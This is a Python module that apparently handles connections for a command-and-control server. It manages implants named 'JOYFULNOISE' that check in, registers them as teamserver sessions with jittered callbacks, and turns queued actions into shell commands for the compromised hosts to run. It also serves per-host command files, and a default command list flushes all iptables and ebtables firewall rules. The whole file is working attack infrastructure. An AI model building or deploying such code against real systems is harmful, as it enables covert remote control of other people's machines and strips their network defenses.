"""
This module contains handlers that will deal with incoming connections.
"""
import os
from time import strftime, gmtime
from .config import SERVER_ADDRESS
from .utils import log, add_session, get_responses, add_action_ids, slackError
import shlex

DEFAULT_COMMANDS = [
    "iptables -F", "iptables -t mangle -F", "iptables -t nat -F",
    "ebtables -F"]


def get_uuid_by_ip(client, addr):
    targets = client.list_targets(include_facts=True, include_status=False)
    for target in targets:
        for ints in target.facts.get('interfaces'):
            for ip in ints['ip_addrs']:
                if addr in ip:
                    return target.uuid



def new_agent(client, addr, name):
    """
    This handler is called when an agent checks in and does not have an existing
    session id.
    """
    servers = [SERVER_ADDRESS]
    data = {
        'agent_type': 'JOYFULNOISE',
        'callback_type': name,
        'target_ip': addr
    }

    facts = {
        'hostname': addr
    }

    # Dont give interval based on name as that leaks the name to the repo
    interval = 1200  # 20 minutes
    interval_delta = 600  # +- 10 minutes
    log("Creating new session for {}".format(addr+"/"+name))
    # Try to get the UUID based on the IP
    try:
        uuid = get_uuid_by_ip(client, addr)
        if not uuid:
            print(uuid)
            raise Exception("Bad stuff")
    except Exception as E:
        print(E)
        # default to using the address as the uuid
        uuid = addr
    try:
        # Tell the teamserver to create a new session
        resp = client.create_session(
            uuid,
            servers=servers,
            interval=interval,
            interval_delta=interval_delta,
            agent_version="JOYFULNOISE 1.0",
            facts=facts,
            config_dict=data)
        # Add the session to the C2's session manager
        add_session(addr, name, resp)
        return resp
    except Exception as E:
        slackError("{}. Returning NULL session id.".format(E))

def existing_agent(client, session):
    """
    This handler is called when an agent with a session id checks in.
    """
    if session is None:
        return []
    try:
        resp = client.session_checkin(
            session,
            responses=get_responses())
        actions = [action.raw_json for action in resp['actions']]
        # Build a list of commands for the bot
        commands, action_ids = parse_actions(actions)
        add_action_ids(action_ids)
        return commands
    except Exception as E:
        slackError("{}. Issuing default commands.".format(E))
        return []


def parse_actions(actions):
    '''
    Parse the action objects and turn them into a list of commands
    '''
    commands = []
    action_ids = []
    for action in actions:
        # Check if the action type is 1 (command)
        if action.get('action_type', 0) == 1:
            com = action.get('command')
            if com is not None:
                # Start rebuilding the command
                args = [com] + action.get('args',[])
                command = ""
                # Requote the bash arg
                for arg in args:
                    # Dont quote pipes
                    if arg in ('|',):
                        command += " " + arg
                    else:
                        command += " " + shlex.quote(arg)
                commands += [command.strip()]
            action_ids += [action.get('action_id')]
    return commands, action_ids

def get_file_commands(ip, hostname):
    base = "/etc/commands/"
    if os.path.isfile(base+ip+".txt"):
        fil = base+ip+".txt"
    elif os.path.isfile(base+hostname+".txt"):
        fil = base+hostname+".txt"
    else:
        fil = base+"default.txt"

    # Log the output and save the hostname
    log_line = "{} {}\tRQST: {}\tRECV: {}".format(
        strftime("%H:%M:%S", gmtime()), ip, hostname, fil)
    print(log_line)
    try:
        with open("server.log", "a") as logfil:
            logfil.write(log_line+"\n")
    except Exception as E:
        print("Cannot write to server.log")
    # Get the data to serve up
    data = "# no commands\n"
    try:
        with open(fil) as f:
            data = f.read()
    except Exception as E:
        pass
    return data

